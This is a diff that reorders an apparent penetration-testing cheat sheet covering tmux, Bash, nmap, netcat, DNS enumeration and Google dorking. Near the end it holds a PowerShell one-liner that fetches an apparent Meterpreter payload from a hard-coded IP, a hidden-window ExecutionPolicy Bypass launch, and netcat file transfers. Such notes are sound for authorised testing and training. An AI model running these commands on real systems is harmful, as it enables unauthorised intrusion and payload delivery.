@@ -1,3 +1,7 @@
+####################
+#       GENERAL	   #
+####################
+
 # ----- tmux ----- #
 #### https://danielmiessler.com/study/tmux/#screen
 ### Install ###
@@ -10,119 +14,15 @@ CTRL+B p (switch to previous)
 CTRL+B n (switch to next window)
 CTRL+B w (list of open windows
 
-# ----- Bash ----- #
 
-### For loop
-for ip in $(cat file.txt); do echo $ip; done
-
-### Create directory structure for each IP in file.txt
-for ip in $(cat file.txt); do mkdir -p "$ip"/{penetration,notes,pillage,remote-enum,root-in-10-steps-or-less}; done
-
-### Parse file data
-cut -d'.' -f1 filename.txt |sort -u
-
-### Convert newline to comma
-cat filename.txt | tr '\n' ,
-
-### Wordlist locations
-/usr/share 
-
-### Remove Space from file name
-for f in *\ *; do mv "$f" "${f// /_}"; done
-
-### BULK screenshots using ffmpeg
-
-	#!/bin/bash
-	# Remove space from fiel name
-	for f in *\ *; do mv "$f" "${f// /_}"; done;
-	# take screenshot of all files in folder
-	for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg; done;
-	# convert add 0 for better sorting (1.jpg to 01.jpg)
-	#for i in $(ls | grep jpg|cut -d'_' -f3|cut -d'.' -f1);do if (($i < 26));then mv *$i.jpg 0$i.jpg; fi ; done;
-	for i in $(ls | cut -d'_' -f2| cut -d '.' -f1);do if (($i < 26));then mv OnDemand_$i.jpg 0$i.jpg; fi ; done;
-	# Get folder name to rename pdf
-	Fname="$(pwd | cut -d'/' -f8)";
-	# Use imagemagicK to convert jpg to pdf
-	convert *.jpg ../$Fname.pdf;
-	# remove jpg
-	rm *.jpg;
-	exec bash
-
-
-
-# ----- Linux Commands ----- #
-### Process Running
-netstat -antp | grep sshd
-
-### Start HTTP Service (/var/www)
-service apache2 start
-
-### Service Persistence on reboot 
-update-rc.d ssh enable
-update-rc.d apache2 enable
-
-
-# ----- NetCat ----- #
-### Connect using netcat
-nc -nv IPaddress port
-
-### Netcat listner
-nv -nlvp 4444
-
-## Netcat transfer
-
-### Receiver
-nc -l -p 1234 > out.file
-
-### Sender
-nc -w 3 [destination] 1234 < out.file
-
-### SIMPLE TCP & UDP PORT SCAN
-nc -nvv -w 1 -z IPADDRESS START_PORT-END_PORT
-nc -unvv -w 1 -z IPADDRESS START_PORT-END_PORT
-
-
-# ----- NCat (Supports encrypted tunnel) ----- #
-### Listener
-ncat -nlvp IPAddress 4444
-
-### Connect
-ncat -v IPAddress 4444 --ssl
-
-# ----- Google Hacking CMD ----- #
-### Search specific site
-Site:"microsoft.com"
-
-### Exclude results from www.microsoft.com
-Site:"microsoft.com" -site:"www.microsoft.com
-
-### Search specific file type
-site:"microsoft.com: filetype:ppt
-
-intitle:"VNC viewer for java"
-
-inurl:"/specific/url/"
-
-# ----- DNS ENUMBERATION ----- #
-### name server
-host -t ns domain.com
-
-### mail server
-host -t mx domain.com
-
-### Forward lookup (domain to IP)
-for subdomain in $(list.txt);do nslookup $subdomain.DOMAIN.com|grep "Address: " | cut -d " " -f1,4;done
-
-### Reverse DNS lookup (IP range to doamin)
-for ip in (seq 1 255); do host 10.10.10.$ip |grep "DOMAIN" |cut -d" " -f1,5; done
-
-### ZONE TRANSFERS (Get all domains in DNS)
-host -l ns DOMAIN.COM
-
-## BUILT TOOLS
-DNSRECON, DNSENUM
+####################
+#       RECON	   #
+####################
 
 # ----- PORT SCANNING ----- #
+
+### Basic Scan
+nmap -sV -sC -oA nmap 10.10.1.1
 
 SYN SCANNING (half scan) 
 
@@ -187,6 +87,46 @@ nmap -p 80 --script all IPADDRESS
 ## Other Tools
 openvas-setup
 
+####################
+#  EXPLOITATION    #
+####################
+
+
+####################
+#  POST EXPLOIT    #
+####################
+
+# ----- Search ----- #
+find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
+
+
+# ----- NetCat ----- #
+### Connect using netcat
+nc -nv IPaddress port
+
+### Netcat listner
+nv -nlvp 4444
+
+## Netcat transfer
+
+### Receiver
+nc -l -p 1234 > out.file
+
+### Sender
+nc -w 3 [destination] 1234 < out.file
+
+### SIMPLE TCP & UDP PORT SCAN
+nc -nvv -w 1 -z IPADDRESS START_PORT-END_PORT
+nc -unvv -w 1 -z IPADDRESS START_PORT-END_PORT
+
+
+# ----- NCat (Supports encrypted tunnel) ----- #
+### Listener
+ncat -nlvp IPAddress 4444
+
+### Connect
+ncat -v IPAddress 4444 --ssl
+
 
 
 # ----- Transferring Files from Linux to  ----- #
@@ -197,6 +137,95 @@ python -m SimpleHTTPServer
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File “YourScript.ps1” 
+
+
+# ----- Bash ----- #
+
+### For loop
+for ip in $(cat file.txt); do echo $ip; done
+
+### Create directory structure for each IP in file.txt
+for ip in $(cat file.txt); do mkdir -p "$ip"/{penetration,notes,pillage,remote-enum,root-in-10-steps-or-less}; done
+
+### Parse file data
+cut -d'.' -f1 filename.txt |sort -u
+
+### Convert newline to comma
+cat filename.txt | tr '\n' ,
+
+### Wordlist locations
+/usr/share 
+
+### Remove Space from file name
+for f in *\ *; do mv "$f" "${f// /_}"; done
+
+### BULK screenshots using ffmpeg
+
+	#!/bin/bash
+	# Remove space from fiel name
+	for f in *\ *; do mv "$f" "${f// /_}"; done;
+	# take screenshot of all files in folder
+	for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg; done;
+	# convert add 0 for better sorting (1.jpg to 01.jpg)
+	#for i in $(ls | grep jpg|cut -d'_' -f3|cut -d'.' -f1);do if (($i < 26));then mv *$i.jpg 0$i.jpg; fi ; done;
+	for i in $(ls | cut -d'_' -f2| cut -d '.' -f1);do if (($i < 26));then mv OnDemand_$i.jpg 0$i.jpg; fi ; done;
+	# Get folder name to rename pdf
+	Fname="$(pwd | cut -d'/' -f8)";
+	# Use imagemagicK to convert jpg to pdf
+	convert *.jpg ../$Fname.pdf;
+	# remove jpg
+	rm *.jpg;
+	exec bash
+
+
+
+# ----- Linux Commands ----- #
+### Process Running
+netstat -antp | grep sshd
+
+### Start HTTP Service (/var/www)
+service apache2 start
+
+### Service Persistence on reboot 
+update-rc.d ssh enable
+update-rc.d apache2 enable
+
+
+# ----- Google Hacking CMD ----- #
+### Search specific site
+Site:"microsoft.com"
+
+### Exclude results from www.microsoft.com
+Site:"microsoft.com" -site:"www.microsoft.com
+
+### Search specific file type
+site:"microsoft.com: filetype:ppt
+
+intitle:"VNC viewer for java"
+
+inurl:"/specific/url/"
+
+# ----- DNS ENUMBERATION ----- #
+### name server
+host -t ns domain.com
+
+### mail server
+host -t mx domain.com
+
+### Forward lookup (domain to IP)
+for subdomain in $(list.txt);do nslookup $subdomain.DOMAIN.com|grep "Address: " | cut -d " " -f1,4;done
+
+### Reverse DNS lookup (IP range to doamin)
+for ip in (seq 1 255); do host 10.10.10.$ip |grep "DOMAIN" |cut -d" " -f1,5; done
+
+### ZONE TRANSFERS (Get all domains in DNS)
+host -l ns DOMAIN.COM
+
+## BUILT TOOLS
+DNSRECON, DNSENUM
+
+
+
 
 
 # ----- Metasploit ----- #
